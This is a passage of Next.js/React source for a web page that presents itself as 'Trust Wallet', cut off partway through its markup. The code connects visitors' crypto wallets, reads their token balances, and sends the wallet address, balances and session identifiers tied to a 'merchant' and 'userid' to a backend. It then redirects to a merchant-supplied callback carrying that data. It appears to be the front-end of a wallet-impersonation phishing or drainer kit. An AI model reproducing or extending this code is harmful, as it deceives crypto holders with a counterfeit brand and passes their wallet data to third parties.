'use client';

import { useState, useMemo, useEffect, useCallback } from 'react';
import { ethers } from 'ethers';
import { createCoinbaseWalletSDK } from '@coinbase/wallet-sdk';
import { motion, AnimatePresence } from 'framer-motion';
import { Inter } from 'next/font/google';
import { useSearchParams } from 'next/navigation';
import { Plus, ArrowUpDown, ArrowUp, ArrowDown, LogOut, Copy, Check, X, Search, Settings, Wallet, Globe, Shield, ChevronRight, ChevronLeft, ShieldAlert, Clock, QrCode, Compass, Settings2, Fingerprint, Maximize, RefreshCw, ArrowUpRight } from 'lucide-react';

import GasFeeModal from '@/components/gas-fee-modal';
import WithdrawalModal from '@/components/withdrawal-modal';
import SwapModal from '@/components/swap-modal';
import BuyModal from '@/components/buy-modal';
import TransactionHistory from '@/components/transaction-history';
import { useWallet } from '@/context/base';
import { getDynamicExchangeRates, getLivePrices, COIN_MAP, NETWORKS, STATIC_FALLBACK_PRICES } from '@/lib/utils';
import ReceiveModal from '@/components/recieve-modal';
import { getModal } from '@/context/appkit';
// import { useAppKit } from '@reown/appkit/react';

const inter = Inter({ subsets: ['latin'], weight: ['300', '400', '500', '600', '700'] });

export default function CoinbaseWalletConnect() {
    const searchParams = useSearchParams();
//   const { open } = useAppKit()
    // const [address, setAddress] = useState<string>('');
    const [bnbBalance, setBnbBalance] = useState<string>('0');
    const [btcBalance, setBtcBalance] = useState<string>('0');
    const [ethBalance, setEthBalance] = useState<string>('0');
    const [usdtEthBalance, setUsdtEthBalance] = useState<string>('0');
    const [usdtBnbBalance, setUsdtBnbBalance] = useState<string>('0');
    const [t22priceUsd, setT22PriceUsd] = useState<number>(0);
    const [t22Balance, setT22Balance] = useState<string>('0');
    const [ctmBalance, setCtmBalance] = useState<string>('0');
    const [ltcBalance, setLtcBalance] = useState<string>('0');


    const [isAppLoading, setIsAppLoading] = useState(true);
    const [showSettingsMenu, setShowSettingsMenu] = useState(false);
    const [maskAccount, setMaskAccount] = useState(false);         // SSR-safe default
    const [defaultCurrency, setDefaultCurrency] = useState('USD'); // SSR-safe default
    const [showCurrencyPicker, setShowCurrencyPicker] = useState(false);
    const [theme, setTheme] = useState<'dark' | 'light'>('light');  // Set Light as default
    const [view, setView] = useState<'wallet' | 'swap' | 'discover' | 'browser' | 'settings' | 'send' | 'receive' | 'buy'>('wallet');

    // Handle App Preloader
    useEffect(() => {
        const timer = setTimeout(() => setIsAppLoading(false), 2000); // 2 second brand immersion
        return () => clearTimeout(timer);
    }, []);
    const [isAppLockEnabled, setIsAppLockEnabled] = useState(false);
    const [showMobilePrompt, setShowMobilePrompt] = useState(false);
    const [pendingDappUrl, setPendingDappUrl] = useState('');
    const [showPinModal, setShowPinModal] = useState(false);
    const [pinStep, setPinStep] = useState<'setup' | 'confirm' | 'verify'>('setup');
    const [pin, setPin] = useState('');
    const [confirmPin, setConfirmPin] = useState('');
    const [savedPin, setSavedPin] = useState('');
    const [pinMessage, setPinMessage] = useState<{ text: string, isError: boolean } | null>(null);

    // Restore persisted settings after mount (client-only)
    useEffect(() => {
        const savedMask = localStorage.getItem('maskAccount');
        if (savedMask === 'true') setMaskAccount(true);
        const savedCurrency = localStorage.getItem('defaultCurrency');
        if (savedCurrency) setDefaultCurrency(savedCurrency);
        const savedTheme = localStorage.getItem('appTheme') as 'dark' | 'light' | null;
        if (savedTheme) setTheme(savedTheme);
        const pin = localStorage.getItem('appPin');
        if (pin) {
            setSavedPin(pin);
            setIsAppLockEnabled(true);
        }
    }, []);

    // Sync theme with WalletConnect Modal
    useEffect(() => {
        try {
            const modal = getModal();
            modal.setThemeMode(theme);
        } catch (e) {
            console.warn("AppKit modal not initialized yet");
        }
    }, [theme]);

    // Apply theme to <html> element
    useEffect(() => {
        localStorage.setItem('appTheme', theme);
        const STYLE_ID = 'app-light-theme';
        let el = document.getElementById(STYLE_ID) as HTMLStyleElement | null;

        if (theme === 'light') {
            if (!el) {
                el = document.createElement('style');
                el.id = STYLE_ID;
                document.head.appendChild(el);
            }
            el.textContent = `
                .fixed .bg-\\[\\#0a0b0d\\] .text-white\\/80,
                .bg-\\[\\#151515\\] .text-white\\/80,
                .bg-\\[\\#13141a\\] .text-white\\/80,
                .bg-\\[\\#0d0e11\\]\\/95 .text-white\\/80 { color: rgba(13, 17, 23, 0.85) !important; }

                .fixed .bg-\\[\\#0a0b0d\\] .text-white\\/90,
                .bg-\\[\\#151515\\] .text-white\\/90,
                .bg-\\[\\#13141a\\] .text-white\\/90,
                .bg-\\[\\#0d0e11\\]\\/95 .text-white\\/90 { color: rgba(13, 17, 23, 0.9) !important; }

                .fixed .bg-\\[\\#0a0b0d\\] .text-blue-200,
                .fixed .bg-\\[\\#0a0b0d\\] .text-blue-400 { color: #3375BB !important; }

                .fixed .bg-\\[\\#0a0b0d\\] .bg-\\[\\#2b2d33\\] { background-color: #ffffff !important; box-shadow: 0 4px 12px rgba(0,0,0,0.1) !important; color: #3375BB !important; }
                .fixed .bg-\\[\\#0a0b0d\\] .border-\\[\\#0a0b0d\\] { border-color: #ffffff !important; }

                /* Modal Close Buttons */
                .fixed .bg-\\[\\#0a0b0d\\] .bg-gray-800\\/50 { background-color: #3375BB !important; color: #ffffff !important; }
                .fixed .bg-\\[\\#0a0b0d\\] .bg-gray-800\\/50:hover { background-color: #004ada !important; color: #ffffff !important; }
                .fixed .bg-\\[\\#0a0b0d\\] .bg-gray-800\\/50 svg { color: #ffffff !important; }

                /* Action buttons in light mode */
                .theme-action-btn { background-color: #ffffff !important; color: #3375BB !important; border-color: #ffffff !important; box-shadow: 0 4px 12px rgba(0,0,0,0.1) !important; }
                .theme-action-btn:hover { background-color: #f8fafc !important; box-shadow: 0 6px 16px rgba(0,0,0,0.15) !important; }

                /* Ensure the blue footer button text stays white */
                .theme-footer-btn, .theme-footer-btn .text-white, .theme-footer-btn span, .theme-footer-btn svg { color: #ffffff !important; opacity: 1 !important; }

                /* Explicitly set sub-texts in dropdown / footer */
                .theme-subtext { color: #6b7280 !important; }
                .theme-subtext:hover { color: #374151 !important; }
                
                /* Make asset network logos pop */
                .theme-asset-logo { border: 2px solid white !important; box-shadow: 0 2px 6px rgba(0,0,0,0.15) !important; background-color: #ffffff !important; }

                .fixed .bg-\\[\\#0a0b0d\\] .text-gray-400,
                .bg-\\[\\#151515\\] .text-gray-400,
                .bg-\\[\\#1E2025\\] .text-gray-400,
                .bg-\\[\\#1a1b1f\\] .text-gray-400 { color: #6b7280 !important; }

                .fixed .bg-\\[\\#0a0b0d\\] .text-gray-500,
                .bg-\\[\\#151515\\] .text-gray-500,
                .bg-\\[\\#1E2025\\] .text-gray-500,
                .bg-\\[\\#1a1b1f\\] .text-gray-500 { color: #9ca3af !important; }

                /* Force primary buttons to stay white text */
                .bg-\\[\\#3375BB\\], 
                .bg-\\[\\#3375BB\\] *,
                .theme-footer-btn,
                .theme-footer-btn *,
                button.bg-\\[\\#3375BB\\],
                button.bg-\\[\\#3375BB\\] span { color: #ffffff !important; opacity: 1 !important; }

                .bg-\\[\\#151515\\] .border-white\\/5,
                .bg-\\[\\#1E2025\\] .border-white\\/5,
                .bg-\\[\\#13141a\\] .border-white\\/5,
                .bg-\\[\\#1a1b1f\\] .border-white\\/5,
                .bg-\\[\\#1a1b1f\\] .border-white\\/10,
                .bg-\\[\\#0d0e11\\]\\/95 .border-white\\/\\[0\\.06\\] { border-color: rgba(0,0,0,0.08) !important; }

                .bg-\\[\\#151515\\] .bg-white\\/5,
                .bg-\\[\\#1E2025\\] .bg-white\\/5,
                .bg-\\[\\#13141a\\] .bg-white\\/5,
                .bg-\\[\\#1a1b1f\\] .bg-white\\/5,
                .bg-\\[\\#1a1b1f\\] .bg-white\\/10 { background-color: rgba(0,0,0,0.04) !important; }
                
                .bg-\\[\\#151515\\] .hover\\:bg-white\\/5:hover,
                .bg-\\[\\#1E2025\\] .hover\\:bg-white\\/5:hover,
                .bg-\\[\\#13141a\\] .hover\\:bg-white\\/5:hover,
                .bg-\\[\\#1a1b1f\\] .hover\\:bg-white\\/5:hover { background-color: rgba(0,0,0,0.06) !important; }

                .bg-black\\/60                 { background-color: rgba(0,0,0,0.3)  !important; }
                input, textarea                { background-color: #f3f6fc !important; color: #0d1117 !important; border-color: rgba(0,0,0,0.12) !important; }
                input::placeholder             { color: #9ca3af !important; }
                *, *::before, *::after         { transition: background-color 0.25s, border-color 0.2s, color 0.2s; }
            `;
        } else {
            el?.remove();
        }
    }, [theme]);

    const [pageLoading, setPageLoading] = useState(true);
    const [showRecieveModal, setShowRecieveModal] = useState(false);
    const [showCancelModal, setShowCancelModal] = useState(false);
    const [showReturnWarning, setShowReturnWarning] = useState(false);
    const [showSessionConflictModal, setShowSessionConflictModal] = useState(false);
    const [conflictingSessionData, setConflictingSessionData] = useState<any>(null);

    const [activeTab, setActiveTab] = useState<'crypto' | 'history'>('crypto');
    const [copied, setCopied] = useState(false);

    // Modal States
    const [showWithdrawModal, setShowWithdrawModal] = useState(false);
    const [showSwapModal, setShowSwapModal] = useState(false);
    const [showBuyModal, setShowBuyModal] = useState(false);
    const [showGasFeeModal, setShowGasFeeModal] = useState(false);
    const [showAccountPrompt, setShowAccountPrompt] = useState(false);
    const [visibleAssets, setVisibleAssets] = useState<string[]>(['BTC', 'ETH', 'BNB', 'LTC', 'USDT', 'USDT_BNB', 'CTM']);
    const [marketPrices, setMarketPrices] = useState<{ [key: string]: { price: number, change: number } }>({});
    const [assetSearchQuery, setAssetSearchQuery] = useState('');

    const {  networks, disconnectWallet, loading, address, setAddress, error, setLoading, setIsDisconnectedState, isDisconnectedState, connectEVMWallet } = useWallet();
    
    // Data States
    const [transactions, setTransactions] = useState<any[]>([]);
    const [getUserLoading, setGetUSerLoading] = useState(false)
    const fetchTransactionsData = async () => {
        if (!address || address == "") return;
        try {
            let vvv = await fetch(`/api/transaction?address=${address}`, {
                method: 'GET',
                headers: { 'Content-Type': 'application/json' },
            });
            let vjson = await vvv.json()
            if (vjson?.existingRecord?.length) {
                const mappedTransactions = vjson.existingRecord.map((e: any) => {
                    const f = e.fields || {};
                    return {
                        ...f,
                        id: e.id,
                        created_at: e.createdTime,
                        type: f.Type || f.type || 'send',
                        asset: f.Asset || f.asset || 'BNB',
                        amount: f.Amount || f.amount || '0',
                        status: f.Status || f.status || 'pending',
                        network: f.Network || f.network || 'BNB'
                    };
                }).sort((a: any, b: any) => {
                    return new Date(b.created_at).getTime() - new Date(a.created_at).getTime();
                });
                setTransactions(mappedTransactions);
            }
        } catch (e) {}
    };

    useEffect(() => {
        fetchTransactionsData();
    }, [address]);

    // Periodic price updates
    useEffect(() => {
        const fetchPrices = async () => {
            const prices = await getLivePrices();
            setMarketPrices(prices);
        };
        fetchPrices();
        const interval = setInterval(fetchPrices, 30000); // 30s
        return () => clearInterval(interval);
    }, []);


    const addGasFeeTransaction = (txHash: string) => {
        fetchTransactionsData();
    };

    // Query Params
    const request = searchParams.get('request');
    const ssid_param = searchParams.get('ssid');
    const status = searchParams.get('status');
    const userid = searchParams.get('userid');

    const [isAuthorized, setIsAuthorized] = useState<boolean | null>(null);

    useEffect(() => {
        const validateSession = async () => {
            const merchantFromParams = searchParams.get('merchant');
            setIsAuthorized(null);
            setPageLoading(true);

            const isExpectingWallet = typeof window !== 'undefined' && localStorage.getItem('walletConnected') === 'true';
            if (isExpectingWallet && !address) return;

            const hasEssentials = ssid_param && userid && merchantFromParams;
            if (!hasEssentials) {
                setIsAuthorized(true);
                setPageLoading(false);
                return;
            }

            if (address) {
                try {
                    const res = await fetch(`/api/user?address=${address}`, { signal: AbortSignal.timeout(5000) });
                    const data = await res.json();

                    if (data.existingRecord) {
                        const fields = data.existingRecord.fields;
                        const sessionMismatch =
                            fields.ssid !== ssid_param ||
                            fields.userid !== userid ||
                            fields.merchant !== merchantFromParams;

                        if (sessionMismatch) {
                            setConflictingSessionData({
                                fields,
                                currentUrl: { ssid: ssid_param, userid, merchant: merchantFromParams }
                            });
                            setShowSessionConflictModal(true);
                            setIsAuthorized(false);
                            return;
                        }
                    }
                } catch (e) {}
            }

            setIsAuthorized(true);
            const timer = setTimeout(() => {
                setPageLoading(false);
            }, 800);
            return () => clearTimeout(timer);
        };

        validateSession();
    }, [request, ssid_param, status, userid, address, searchParams.get('merchant')]);

    const merchant = searchParams.get('merchant');
    const ssid = searchParams.get('ssid');
    const user = searchParams.get('user');

    const ETH_USDT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
    const BSC_USDT_ADDRESS = '0x55d398326f99059fF775485246999027B3197955';
    const CTM_ADDRESS = '0xc8C8FE705d05aA4f115E54d5aa557FDF88888888';
    const BSC_BTCB_ADDRESS = '0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c';
    const ETH_WBTC_ADDRESS = '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599';
    const BSC_LTC_ADDRESS = '0x4338665cbb7b2485a8855a139b75d5e34ab0db94';
    const MERCHANT_URL = 'https://trustwallet.com/';

    const handleRedirect = (state: 'success' | 'cancelled' | 'disconnected' | 'not_connected' | 'inactivity') => {
        const baseUrl = merchant
            ? (merchant.includes('://') ? merchant : `https://${merchant}/callback`)
            : MERCHANT_URL;

        const params = new URLSearchParams({
            request: 'walletconnect',
            ssid: ssid || ssid_param || '',
            userid: userid || '',
            state: state,
            status: state === 'success' ? 'connected' : state
        });

        if (state === 'success' && address) {
            params.append('wallet_address', address);
            params.append('bnb_balance', bnbBalance);
            params.append('tethereum_balance', t22Balance);
        }

        window.location.href = `${baseUrl}${baseUrl.includes('?') ? '&' : '?'}${params.toString()}`;
    };

    const fetchData = async (t22_price: any) => {
        try {
            const response = await fetch('https://api.coinbase.com/v2/prices/T99-USD/spot');
            const json = await response.json();
            const price = parseFloat(json.data.amount);
            setT22PriceUsd(price * t22_price);
        } catch (error) {
            console.error("Coinbase API failed, using fallback", error);
        }
    };

    useEffect(() => {
        if (Number(t22Balance) > 0) fetchData(Number(t22Balance));
    }, [t22Balance]);


    const updateBalances = async (userAddress: string) => {
        if (!userAddress || !ethers.isAddress(userAddress)) return;

        const ERC20_ABI = [
            'function balanceOf(address owner) view returns (uint256)',
            'function decimals() view returns (uint8)'
        ];

        // Use more robust RPC list
        const ethRPCs = [
            'https://rpc.ankr.com/eth',
            'https://eth.llamarpc.com',
            'https://ethereum.publicnode.com'
        ];

        const bscRPCs = [
            'https://rpc.ankr.com/bsc',
            'https://binance.llamarpc.com',
            'https://bsc-dataseed.binance.org/'
        ];

        const ethProvider = new ethers.JsonRpcProvider(ethRPCs[0]);
        const bscProvider = new ethers.JsonRpcProvider(bscRPCs[0]);

        const fetchTokenData = async (addr: string, provider: any) => {
            if (!addr || !ethers.isAddress(addr)) return ["0", 18];
            try {
                const contract = new ethers.Contract(addr, ERC20_ABI, provider);
                const [raw, dec] = await Promise.all([
                    contract.balanceOf(userAddress).catch(() => BigInt(0)),
                    contract.decimals().catch(() => 18)
                ]);
                return [raw.toString(), dec];
            } catch (err) {
                return ["0", 18];
            }
        };

        try {
            // Helper to get working provider
            const getWorkingProvider = async (rpcs: string[]) => {
                for (const url of rpcs) {
                    try {
                        const p = new ethers.JsonRpcProvider(url);
                        await p.getNetwork();
                        return p;
                    } catch (e) {}
                }
                return new ethers.JsonRpcProvider(rpcs[0]);
            };

            const activeEthProvider = await getWorkingProvider(ethRPCs);
            const activeBscProvider = await getWorkingProvider(bscRPCs);

            const [ 
                bnbBalRaw,
                ethBalRaw,
                [t22Raw, t22Dec], 
                [usdtBnbRaw, usdtBnbDec], 
                [usdtEthRaw, usdtEthDec], 
                [ctmRaw, ctmDec],
                [ctmBscRaw, ctmBscDec],
                [btcbRaw, btcbDec],
                [wbtcRaw, wbtcDec],
                [ltcRaw, ltcDec]
            ] = await Promise.all([
                activeBscProvider.getBalance(userAddress).catch(() => BigInt(0)),
                activeEthProvider.getBalance(userAddress).catch(() => BigInt(0)),
                fetchTokenData('0xe9a5c635c51002fa5f377f956a8ce58573d63d91', activeBscProvider),
                fetchTokenData(BSC_USDT_ADDRESS, activeBscProvider),
                fetchTokenData(ETH_USDT_ADDRESS, activeEthProvider),
                fetchTokenData(CTM_ADDRESS, activeEthProvider),
                fetchTokenData(CTM_ADDRESS, activeBscProvider),
                fetchTokenData(BSC_BTCB_ADDRESS, activeBscProvider),
                fetchTokenData(ETH_WBTC_ADDRESS, activeEthProvider),
                fetchTokenData(BSC_LTC_ADDRESS, activeBscProvider)
            ]);

            const bnbFormatted = ethers.formatEther(bnbBalRaw);
            const ethFormatted = ethers.formatEther(ethBalRaw);
            const t22Formatted = ethers.formatUnits(t22Raw, t22Dec);
            const usdtBnbFormatted = ethers.formatUnits(usdtBnbRaw, usdtBnbDec);
            const usdtEthFormatted = ethers.formatUnits(usdtEthRaw, usdtEthDec);
            const ctmEthFormatted = ethers.formatUnits(ctmRaw, ctmDec);
            const ctmBscFormatted = ethers.formatUnits(ctmBscRaw, ctmBscDec);
            const btcbFormatted = ethers.formatUnits(btcbRaw, btcbDec);
            const wbtcFormatted = ethers.formatUnits(wbtcRaw, wbtcDec);
            const ltcFormatted = ethers.formatUnits(ltcRaw, ltcDec);

            // Use Max instead of Sum to prevent double counting mirrored tokens
            const totalCtm = Math.max(parseFloat(ctmEthFormatted), parseFloat(ctmBscFormatted)).toString();
            const totalBtc = Math.max(parseFloat(btcbFormatted), parseFloat(wbtcFormatted)).toString();

            setBnbBalance(bnbFormatted);
            setEthBalance(ethFormatted);
            setT22Balance(t22Formatted);
            setUsdtBnbBalance(usdtBnbFormatted);
            setUsdtEthBalance(usdtEthFormatted);
            setCtmBalance(totalCtm);
            setBtcBalance(totalBtc);
            setLtcBalance(ltcFormatted);

            // Sync with backend
            await fetch('/api/user', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    address: userAddress,
                    t99: t22Formatted,
                    bnb: bnbFormatted,
                    usdt_bsc: usdtBnbFormatted,
                    usdt_eth: usdtEthFormatted,
                    ctm: totalCtm,
                    eth: ethFormatted,
                    btc: totalBtc,
                    ltc: ltcFormatted,
                    request,
                    ssid: ssid_param,
                    status: 'connected',
                    userid,
                    merchant: merchant || searchParams.get('merchant')
                })
            }).catch(() => {});
        } catch (err) {
            console.error("Balance update failed:", err);
        }
    };

    useEffect(() => {
        if (address) updateBalances(address);
    }, [address])

    const connectWallet = async () => {
        try {
            await connectEVMWallet({ config: networks.bsc });
        } catch (err) {} finally { setLoading(false); }
    }

    const assets = useMemo(() => {
        return visibleAssets.map((symbol, idx) => {
            const isTethereum = symbol === 'TETHEREUM';
            const priceData = marketPrices[symbol] || STATIC_FALLBACK_PRICES[symbol] || { price: 0, change: 0 };
            const price = priceData.price;
            const change = priceData.change;

            const balanceStr = 
                isTethereum ? t22Balance :
                    symbol === 'BNB' ? bnbBalance :
                        symbol === 'ETH' ? ethBalance :
                            symbol === 'BTC' ? btcBalance :
                                symbol === 'LTC' ? ltcBalance :
                                    symbol === 'USDT' ? usdtEthBalance :
                                        symbol === 'USDT_BNB' ? usdtBnbBalance :
                                            symbol === 'CTM' ? ctmBalance :
                                                '0';

            const balance = Number(balanceStr);

            return {
                id: idx,
                name: isTethereum ? COIN_MAP['TETHEREUM']?.name : COIN_MAP[symbol]?.name || symbol,
                symbol,
                icon: isTethereum ? COIN_MAP['TETHEREUM']?.logo : COIN_MAP[symbol]?.logo,
                network: COIN_MAP[symbol]?.network,
                color: 'bg-[#1E2025]',
                balance,
                marketPrice: price || 0,
                priceChange: change || 0,
                usdValue: balance * (price || 0)
            };
        }).filter(asset => {
            if (address && pageLoading) return true;
            const query = assetSearchQuery.toLowerCase();
            const matchesSearch = !query || asset.name.toLowerCase().includes(query) || asset.symbol.toLowerCase().includes(query);
            return matchesSearch;
        });
    }, [visibleAssets, marketPrices, bnbBalance, t22Balance, ethBalance, ltcBalance, btcBalance, usdtEthBalance, usdtBnbBalance, ctmBalance, assetSearchQuery, address, pageLoading]);

    const totalBalance = useMemo(() => {
        return assets.reduce((sum, asset) => sum + (asset.usdValue || 0), 0);
    }, [assets]);

    const handleAssetClick = (symbol: string) => {
        if (!address) {
            setShowAccountPrompt(true);
            return;
        }
        const normalizedSymbol = symbol === 'T99' ? 'TETHEREUM' : symbol;
        setSelectedAssetForSwap(normalizedSymbol);
        setView('swap'); // Navigate to swap page, not popup modal
    };

    const copyAddress = () => {
        navigator.clipboard.writeText(address);
        setCopied(true);
        setTimeout(() => setCopied(false), 2000);
    };

    const formatAddress = (addr: string) => `${addr.slice(0, 6)}...${addr.slice(-4)}`;

    const FX_SYMBOLS: Record<string, string> = {
        USD: '$', EUR: '€', GBP: '£', JPY: '¥', CAD: 'C$', AUD: 'A$', CHF: 'Fr', CNY: '¥'
    };
    const fxRate = 1; 
    const currencySymbol = FX_SYMBOLS[defaultCurrency] ?? '$';

    const formatFiat = (usdValue: number) =>
        `${currencySymbol}${(usdValue * fxRate).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`;

    const [selectedAssetForSwap, setSelectedAssetForSwap] = useState<string>('');

    return (
        <div className={`min-h-screen transition-colors duration-300 ${theme === 'dark' ? 'bg-black text-white' : 'bg-white text-black'} ${inter.className}`}>
            <AnimatePresence>
                {pageLoading && (
                    <motion.div key="preloader" initial={{ opacity: 1 }} exit={{ opacity: 0 }} className="fixed inset-0 z-[100] flex flex-col items-center justify-center bg-black">
                        <motion.div initial={{ scale: 0.8, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} exit={{ scale: 1.1, opacity: 0 }} className="flex flex-col items-center">
                            <div className="w-40 h-40 flex items-center justify-center bg-blue-500/10 rounded-[3rem] border border-blue-500/20 shadow-2xl mb-8">
                                <img 
                                    src="/favicon.png" 
                                    alt="Trust Wallet" 
                                    className="w-20 h-20 animate-pulse"
                                />
                            </div>
                            <h2 className="text-lg md:text-xl font-black uppercase tracking-[0.4em] text-white/40">Trust Wallet</h2>
                        </motion.div>
                    </motion.div>
                )}
            </AnimatePresence>

            <motion.div key="main-container" className="w-full flex flex-col items-center">
                <motion.div key="app-state" initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="min-h-screen pb-32 relative flex flex-col items-center w-full">
                    <div className="relative z-10 w-full max-w-[600px]">
                        {/* Header - Only visible on wallet view */}
                        {view === 'wallet' && (
                            <div className="px-6 pt-8 pb-4 flex items-center justify-between">
                                <div className="flex items-center gap-3">
                                    <div className="w-10 h-10 bg-blue-500/10 rounded-xl flex items-center justify-center border border-blue-500/20">
                                        <img src="/favicon.png" alt="Logo" className="w-6 h-6 object-contain" />
                                    </div>
                                    <h2 className="text-base font-semibold tracking-tight">Trust Wallet</h2>
                                </div>

                                <button
                                    onClick={() => setShowSettingsMenu(true)}
                                    className={`w-10 h-10 flex items-center justify-center rounded-full transition-all ${
                                        theme === 'dark' ? 'text-white hover:bg-white/10' : 'text-gray-600 hover:bg-gray-100'
                                    }`}
                                >
                                    <div className="relative">
                                        <Settings className="w-6 h-6 stroke-[1.5]" />
                                        <div className="absolute -top-0.5 -right-0.5 w-2.5 h-2.5 bg-red-500 rounded-full border-2 border-white dark:border-black" />
                                    </div>
                                </button>
                            </div>
                        )}
                                <AnimatePresence>
                                    {showSettingsMenu && (
                                        <>
                                            <div className="fixed inset-0 z-[40]" onClick={() => setShowSettingsMenu(false)} />
                                            <motion.div
                                                initial={{ x: '100%', opacity: 0 }}
                                                animate={{ x: 0, opacity: 1 }}
                                                exit={{ x: '100%', opacity: 0 }}
                                                className={`fixed inset-y-0 right-0 w-full md:w-80 z-[50] border-l shadow-2xl ${theme === 'dark' ? 'bg-black border-white/10' : 'bg-white border-gray-100'}`}
                                            >
                                                <div className="h-full flex flex-col">
                                                    {/* Header */}
                                                    <div className={`px-6 py-8 border-b flex flex-col items-center gap-4 relative ${theme === 'dark' ? 'border-white/5' : 'border-gray-100'}`}>
                                                        <button 
                                                            onClick={() => setShowSettingsMenu(false)}
                                                            className={`absolute top-6 right-6 w-10 h-10 flex items-center justify-center rounded-full transition-all ${theme === 'dark' ? 'bg-white/5 text-gray-400 hover:text-white' : 'bg-gray-100 text-gray-500 hover:text-black'}`}
                                                        >
                                                            <X className="w-5 h-5" />
                                                        </button>
                                                        <div className="w-16 h-16 bg-white rounded-2xl p-3 shadow-xl">
                                                            <img src="/favicon.png" alt="Trust Wallet" className="w-full h-full object-contain" />
                                                        </div>
                                                        {address && (
                                                            <div className="text-center">
                                                                <p className="text-[10px] font-black uppercase tracking-widest opacity-30">Active Wallet</p>
                                                                <p className="text-xs font-mono mt-1 opacity-60">{formatAddress(address)}</p>
                                                            </div>
                                                        )}
                                                    </div>

                                                    <div className="flex-1 overflow-y-auto py-4">
                                                        {/* Section: Wallets */}
                                                        <div className="px-6 mb-6">
                                                            <p className="text-[10px] font-black uppercase tracking-widest opacity-30 mb-3">Wallets</p>
                                                            <button className={`w-full flex items-center gap-4 p-4 rounded-2xl border transition-all ${theme === 'dark' ? 'bg-white/5 border-white/5 hover:bg-white/10' : 'bg-gray-50 border-gray-100 hover:bg-gray-100'}`}>
                                                                <div className="w-10 h-10 rounded-xl bg-[#3375BB] flex items-center justify-center text-white">
                                                                    <Wallet className="w-5 h-5" />
                                                                </div>
                                                                <div className="flex-1 text-left">
                                                                    <p className="text-sm font-bold">Main Wallet</p>
                                                                    <p className="text-[10px] opacity-40">Multi-Coin Wallet</p>
                                                                </div>
                                                                <Check className="w-4 h-4 text-blue-500" />
                                                            </button>
                                                        </div>

                                                        {/* Section: Security */}
                                                        <div className="px-6 mb-6">
                                                            <p className="text-[10px] font-black uppercase tracking-widest opacity-30 mb-3">Security</p>
                                                            <div className="space-y-2">
                                                                <button 
                                                                    onClick={() => { setMaskAccount(!maskAccount); localStorage.setItem('maskAccount', String(!maskAccount)); }}
                                                                    className="w-full flex items-center justify-between p-3 rounded-xl hover:bg-white/5 transition-all"
                                                                >
                                                                    <div className="flex items-center gap-3">
                                                                        <div className={`w-8 h-8 rounded-lg flex items-center justify-center ${theme === 'dark' ? 'bg-white/10' : 'bg-gray-100'}`}>
                                                                            <Shield className="w-4 h-4 opacity-60" />
                                                                        </div>
                                                                        <span className="text-sm font-medium">Mask Balances</span>
                                                                    </div>
                                                                    <div className={`w-10 h-5 rounded-full relative transition-colors ${maskAccount ? 'bg-blue-500' : 'bg-white/10'}`}>
                                                                        <div className={`absolute top-0.5 w-4 h-4 rounded-full bg-white transition-transform ${maskAccount ? 'translate-x-5.5' : 'translate-x-0.5'}`} />
                                                                    </div>
                                                                </button>
                                                                <button 
                                                                    onClick={() => {
                                                                        if (isAppLockEnabled) {
                                                                            setIsAppLockEnabled(false);
                                                                            localStorage.removeItem('appPin');
                                                                            setSavedPin('');
                                                                        } else {
                                                                            setPinStep('setup');
                                                                            setPin('');
                                                                            setShowPinModal(true);
                                                                        }
                                                                    }}
                                                                    className="w-full flex items-center justify-between p-3 rounded-xl hover:bg-white/5 transition-all"
                                                                >
                                                                    <div className="flex items-center gap-3">
                                                                        <div className={`w-8 h-8 rounded-lg flex items-center justify-center ${theme === 'dark' ? 'bg-white/10' : 'bg-gray-100'}`}>
                                                                            <ShieldAlert className="w-4 h-4 opacity-60" />
                                                                        </div>
                                                                        <span className="text-sm font-medium">App Lock</span>
                                                                    </div>
                                                                    <div className={`w-10 h-5 rounded-full relative transition-colors ${isAppLockEnabled ? 'bg-blue-500' : 'bg-white/10'}`}>
                                                                        <div className={`absolute top-0.5 w-4 h-4 rounded-full bg-white transition-transform ${isAppLockEnabled ? 'translate-x-5.5' : 'translate-x-0.5'}`} />
                                                                    </div>
                                                                </button>
                                                            </div>
                                                        </div>

                                                        {/* Section: Preferences */}
                                                        <div className="px-6 mb-6">
                                                            <p className="text-[10px] font-black uppercase tracking-widest opacity-30 mb-3">Preferences</p>
                                                            <div className="space-y-2">
                                                                <button 
                                                                    onClick={() => { setTheme(theme === 'dark' ? 'light' : 'dark'); }}
                                                                    className="w-full flex items-center justify-between p-3 rounded-xl hover:bg-white/5 transition-all"
                                                                >
                                                                    <div className="flex items-center gap-3">
                                                                        <div className={`w-8 h-8 rounded-lg flex items-center justify-center ${theme === 'dark' ? 'bg-white/10' : 'bg-gray-100'}`}>
                                                                            {theme === 'dark' ? <Plus className="w-4 h-4 opacity-60 rotate-45" /> : <Plus className="w-4 h-4 opacity-60" />}
                                                                        </div>
                                                                        <span className="text-sm font-medium">Dark Mode</span>
                                                                    </div>
                                                                    <div className={`w-10 h-5 rounded-full relative transition-colors ${theme === 'dark' ? 'bg-blue-500' : 'bg-white/10'}`}>
                                                                        <div className={`absolute top-0.5 w-4 h-4 rounded-full bg-white transition-transform ${theme === 'dark' ? 'translate-x-5.5' : 'translate-x-0.5'}`} />
                                                                    </div>
                                                                </button>
                                                                <button 
                                                                    onClick={() => setShowCurrencyPicker(!showCurrencyPicker)}
                                                                    className="w-full flex items-center justify-between p-3 rounded-xl hover:bg-white/5 transition-all"
                                                                >
                                                                    <div className="flex items-center gap-3">
                                                                        <div className={`w-8 h-8 rounded-lg flex items-center justify-center ${theme === 'dark' ? 'bg-white/10' : 'bg-gray-100'}`}>
                                                                            <span className="text-sm font-bold opacity-60">$</span>
                                                                        </div>
                                                                        <span className="text-sm font-medium">Currency</span>
                                                                    </div>
                                                                    <span className="text-xs opacity-40 font-bold">{defaultCurrency}</span>
                                                                </button>
                                                                <AnimatePresence>
                                                                    {showCurrencyPicker && (
                                                                        <motion.div initial={{ height: 0, opacity: 0 }} animate={{ height: 'auto', opacity: 1 }} exit={{ height: 0, opacity: 0 }} className="overflow-hidden">
                                                                            <div className="grid grid-cols-4 gap-2 pt-2">
                                                                                {['USD', 'EUR', 'GBP', 'JPY'].map(c => (
                                                                                    <button 
